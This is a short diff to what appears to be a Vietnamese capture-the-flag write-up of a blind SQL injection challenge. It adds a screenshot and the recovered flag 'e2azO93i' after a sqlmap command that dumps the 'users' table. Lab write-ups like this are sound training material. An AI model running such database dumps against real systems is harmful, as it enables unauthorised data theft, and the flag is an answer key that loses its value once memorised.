@@ -60,5 +60,8 @@ Kết quả trả về 1 bảng là users. Ta thực hiện dump toàn bộ dữ
 
 `python sqlmap.py -r Blind.txt -T users --dump`
 
+![image](https://user-images.githubusercontent.com/115911041/234194016-dc38c959-707d-4b56-9a4c-64477eec96fb.png)
+
+Và ta đã có flag `e2azO93i`
 
 
